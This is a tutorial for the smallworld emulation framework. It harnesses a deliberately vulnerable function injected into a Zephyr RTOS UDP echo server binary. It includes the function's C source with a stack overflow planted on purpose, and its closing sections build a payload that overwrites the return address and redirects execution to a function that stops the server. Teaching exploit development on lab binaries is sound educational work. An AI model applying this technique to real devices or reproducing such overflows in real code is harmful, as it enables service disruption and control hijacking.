# RTOS Demo
In this demonstration, smallworld will be used to harness vulnerable code in an ARM32 RTOS binary for use in dynamic analysis and exploit development. To be specific, we will harness a vulnerable function in a UDP echo server to develop a payload which will stop the server.

## Setup
First, verify that smallworld is installed in your development environment.

```sh
pip install smallworld-re
python -c "import smallworld"
```

Next, we will need a binary to harness. For this example, we use [Zephyr](https://www.zephyrproject.org/), an open source RTOS for embedded devices. We will be using a modified version of their [echo server example](https://github.com/zephyrproject-rtos/zephyr/tree/main/samples/net/sockets/echo_server) with some injected vulnerable code for the sake of demonstration.

*!! TODO: Paragraph below pending advisory on how to include modified Zephyr code in repo*

The `zephyr.elf` binary is included alongside this tutorial. However, if you wish to compile it from scratch, you may do so using `rtos_build.sh`. This bash script uses Docker to pull down the Zephyr SDK, inject the modified `udp.c` file into the example source code, and compile our `zephyr.elf` binary. Note that the Zephyr SDK is a large project, and may take upwards of an hour to fully install. Additionally, if you compile your own binary, some of the hard-coded addresses in `rtos_demo.py` may be offset.

## Harnessing
To start, we must establish some boilerplate to configure logging and hinting for smallworld.

```python
import smallworld
import logging

# Logging/hinting
smallworld.logging.setup_logging(level=logging.INFO)
smallworld.hinting.setup_hinting(stream=True, verbose=True)
log = logging.getLogger("smallworld")
```

### State Machine & Emulator
The first step in configuring our harness is establishing an execution environment. We can create a `Machine`, add our `Executable`, add a `CPU` for our `Executable`'s platform, and add an `Emulator` to execute our configuration. For this example, we'll use the [Unicorn emulator](https://www.unicorn-engine.org/). Additionally, since we know this is an ARM binary, we can add useful type hinting to our script to aid development.

```python
# Machine
machine = smallworld.state.Machine()

# Code
with open("./zephyr.elf", "rb") as f:
	code = smallworld.state.memory.code.Executable.from_elf(f, page_size=1)
	machine.add(code)

# CPU
cpu: ARM = smallworld.state.cpus.CPU.for_platform(code.platform)
machine.add(cpu)

# Emulator
emulator = smallworld.emulators.UnicornEmulator(code.platform)
```

We will use smallworld to harness the aptly named `smallworld_bug` function in `zephyr.elf`. We can find the address of this function either via reverse engineering or by using the `get_symbol_value` method of our `code` object. Then, we can set the `pc` register to this entry point address so that code will execute starting from this instruction.

We'll also need to set an exit point for our emulation. For now, let's use the instruction which returns from the `smallworld_bug` function. This can be found through reverse engineering.

```python
# Entry point / exit point
entry_point = code.get_symbol_value("smallworld_bug")
exit_point  = 0x102084 # Found via reverse engineering
cpu.pc.set(entry_point)
emulator.add_exit_point(exit_point)
```

### Memory & Program State
Since our code is being run out of context, it may expect to have access to memory or state which has not been allocated or initialized. We can configure our harness to account for missing state.

For instance, our code will expect to have a stack. We can create a stack for our harness and set our CPU's stack pointer register (`sp`) to point to it. The following snippet adds a stack which will grow downwards from `0x6000` towards `0x2000`.

```python
# Stack
stack: ARM32Stack = smallworld.state.memory.stack.Stack.for_platform(
	cpu.platform, 0x2000, 0x4000
)
machine.add(stack)
sp = stack.get_pointer()
cpu.sp.set(sp)
```

We also need to consider the arguments being passed to our `smallworld_bug` function. We can discover the signature for this function either by examining the source code or through reverse engineering. Either method reveals that `smallworld_bug` takes an `input` and output `buffer` as arguments.

```c
void smallworld_bug(char* input, char* output);
```

However, in practice, whenever `smallworld_bug` is called, `input` and `output` always point to the same buffer. Therefore, we only need to allocate one buffer of memory. We can use the following statements to allocate a buffer from a byte-string at address `0x1000` and pass its address to `smallworld_bug` by setting the `r0` and `r1` registers.

```python
# Input buffer
buffer_memory_address = 0x1000
input_bytes = b"abcdefghijklmnop"
buffer_memory = smallworld.state.memory.RawMemory.from_bytes(
	input_bytes, buffer_memory_address
)
machine.add(buffer_memory)

# Pass buffer to smallworld_bug
cpu.r0.set(buffer_memory_address)
cpu.r1.set(buffer_memory_address)
```

## Execution
With our harness configured, we can now start executing code. There are multiple ways to do this, but calling `machine.step(emulator)` is ideal for debugging as it logs each instruction as it is executed.

We also want to inspect the output of our execution. We can extract the buffer's memory region from our emulator and print the result.

```python
# Execute
for step in machine.step(emulator):
	pass

# Extract changes to buffer
buffer_memory.extract(emulator)
output_bytes = buffer_memory.to_bytes(byteorder=code.platform.byteorder)
print(f"Buffer: {output_bytes}")
```

Running our harness against `input_bytes` yields the same string of characters capitalized. This confirms that the harness was successful for this input.

```
emulation complete; encountered exit point or went out of bounds
Buffer: b'ABCDEFGHIJKLMNOP'
```

## Refining Harness
A quick review of the source code indicates that our chosen input does not cover every branch in `smallworld_bug`. Specifically, our input buffer does not contain any numeric characters, so the block where `smallworld_is_num(input[i])` is true is never executed.

```c
void smallworld_bug(char* input, char* output) {
	char temp[SMALLWORLD_BUFFER_SIZE] = {0};
	unsigned int t = 0;
	unsigned int i = 0;
	unsigned int j = 0;
	int count = 0;
	char c = '\0';
	while (i < SMALLWORLD_BUFFER_SIZE) {
		if (smallworld_is_num(input[i])) {
			count = smallworld_to_num(input[i]);
			c = input[++i];
			for (j = 0; j < count; j++) {
				temp[t] = c;
				t++;
			}
			i++;
		} else {
			temp[t++] = input[i++];
		}
	}
	smallworld_capitalize(temp, SMALLWORLD_BUFFER_SIZE);
	smallworld_copy(temp, output, SMALLWORLD_BUFFER_SIZE);
}
```

This branch appears to, given a numeric character $n$, repeat the next character $n$ times in the `temp` buffer. Let's try a different input to affect this behavior. The string below should cause our output buffer to display 8 A's followed by 8 B's. The `\0` characters are added to maintain the 16-byte length of the input buffer.

```python
input_bytes = b"8a8b\0\0\0\0\0\0\0\0\0\0\0\0"
```

Unfortunately, running our harness as-is with this modified input raises an "Invalid memory write" error. This error occurs in the `memset` function of libc, which in this binary has been optimized to use the 16-bit Thumb ISA. Since we are stepping through each instruction, our emulator fails to retain state associated with the ISA exchange. This causes these instructions to be misinterpreted as 32-bit ARM leading to the unmapped write.

```plaintext
[!] emulation stopped - reason: Invalid memory write (UC_ERR_WRITE_UNMAPPED)
emulation ended; raised exception (UcError(7), 1287802, 'Quit emulation due to write to unmapped memory address=0x1 i.e. [r3]', {'unmapped_writes': [(BSIDMemoryReferenceOperand(r3), 1)]})
Buffer: b'8a8b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

### Models
We can account for this using another smallworld concept: Models! A `Model` allows users to replace (*i.e. model*) code in a binary with a python function that updates the machine's state. There are many use cases for this: avoiding global state and side effects, emulating IO, or, in this case, avoiding an ISA exchange. Adding the snippet below before our execution step gives our machine a model to use in place of libc's `memset` function.

```python
# Model "memset" from libc (uses Thumb instructions)
class MemsetModel(smallworld.state.models.Model):
	name = "memset"
	platform = cpu.platform
	abi = smallworld.platforms.ABI.NONE
	def model(self, emulator: smallworld.emulators.Emulator) -> None:
		buf = emulator.read_register("r0")
		char = emulator.read_register("r1")
		size = emulator.read_register("r2")
		data = bytes([ char ]) * size
		print(f"Writing {data} to {buf:x}")
		emulator.write_memory_content(buf, data)
memset_address = 0x13a67a # Found via reverse engineering
memset_model = MemsetModel(memset_address)
machine.add(memset_model)
```

Adding this `Model` to our `Machine` allows it to execute `smallworld_bug` with numeric input, and by observing the buffer after execution we can confirm that it worked as expected.

```plaintext
emulation complete; encountered exit point or went out of bounds
Buffer: b'AAAAAAAABBBBBBBB'
```

## RTOS Harnessing for Exploit Development
With our harness configured to execute our vulnerable code out of context against any input, smallworld can become a powerful tool for rapid exploit development.

### Buffer Overflow
In this case, a quick review of the source code reveals a stack-allocated buffer `temp` which may be subject to improper bounds checking. Notably, our earlier test string `b"8a8b..."` allowed us to compress 16 bytes of data into just 4 bytes of input. Perhaps this could be used to perform an out-of-bounds write past the end of the buffer? We can easily test this idea.

Let's start with an input that may expand to 4 bytes past the end of the buffer. Then, after our harness executes, we can read the memory from our emulator between the stack pointer `sp` and bottom of the stack `0x6000` to see if this memory was affected.

```python
input_bytes = b"8a8b4c\0\0\0\0\0\0\0\0\0\0"

... # execution step here

# Print stack
cpu.sp.extract(emulator)
stack_memory = emulator.read_memory(cpu.sp.get(), 0x6000-cpu.sp.get())
print(stack_memory)
```

As expected, we have overflowed our 16-byte buffer and can now write arbitrary data to the stack. Just past our set `exit_point`, this memory will be popped from the stack back into registers. We can use this to gain control over the program.

```plaintext
emulation complete; encountered exit point or went out of bounds
b'AAAAAAAABBBBBBBBcccc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

### Overwrite Return Address
The value which was previously pushed to the stack from the link register (`lr`) will be popped to the program counter register (`pc`). Therefore, we can determine exactly which memory region will be popped to `pc` by setting the value of `lr` to something distinct and observing it in the stack.

```python
cpu.lr.set(0xFFFFFFFF) # Before execution
```

```plaintext
emulation complete; encountered exit point or went out of bounds
b'AAAAAAAABBBBBBBBcccc\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff'
```

This reveals that there are exactly 24 bytes between the end of the buffer and the beginning of the return address on the stack. Therefore, we can overwrite the return address by preparing a 16-byte payload which expands to:
1. 16 bytes to overwrite buffer
2. 24 bytes to overwrite function arguments and local variables
3. 4 bytes to overwrite return address

For this example, we will point `pc` at the function `stop_udp(void)` to take the server offline. We can update `exit_point` to use this function's address and create a payload as shown below.

```python
stop_udp_addr = code.get_symbol_value("stop_udp")
exit_point = stop_udp_addr

...

input_bytes = b"8a8b8c8d\0\0\0\0" + stop_udp_addr.to_bytes(
	4, code.platform.byteorder.value
)

... # execution step here

# Reached stop_udp?
cpu.pc.extract(emulator)
print(f"PC: {hex(cpu.pc.get())}")
print(f"Reached stop_udp: {cpu.pc.get() == stop_udp_addr}")
```

This harness successfully overwrites `pc` and hits our `stop_udp` exit point!

```plaintext
emulation complete; encountered exit point or went out of bounds
Buffer: b'AAAAAAAABBBBBBBB'
Stack memory: b''
PC: 0x1024e4
Reached stop_udp: True
```

## Conclusion
Smallworld provides unique abilities as a dynamic analysis tool when applied to RTOS systems. Small regions of code can easily be harnessed for analysis, debugging, testing, fuzzing, etc. without any dependence on physical hardware or non-local program state.
